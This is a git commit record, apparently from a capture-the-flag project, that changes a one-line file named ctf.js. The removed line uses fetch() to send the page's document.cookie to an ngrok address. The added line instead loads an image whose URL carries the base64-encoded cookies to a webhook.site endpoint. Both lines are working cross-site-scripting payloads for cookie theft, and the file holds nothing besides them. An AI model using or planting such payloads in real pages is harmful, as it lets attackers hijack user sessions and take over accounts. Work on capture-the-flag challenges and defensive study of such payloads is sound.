0ce3272ce0cd987ae16771badcf5b15cf0d5f84b
0xDbgMan <aboud.htb@gmail.com>
2025-11-19 14:13:51 +0200

    Update ctf.js

--- ctf.js
+++ ctf.js
@@ -1,1 +1,2 @@
-fetch('https://fulminant-springingly-kendall.ngrok-free.dev?c=' + document.cookie)
+x = new Image(); x.src = 'https://webhook.site/6f5d44be-f19c-429a-97fa-52e0cc4d8ea6?data='+btoa(document.cookie);
+
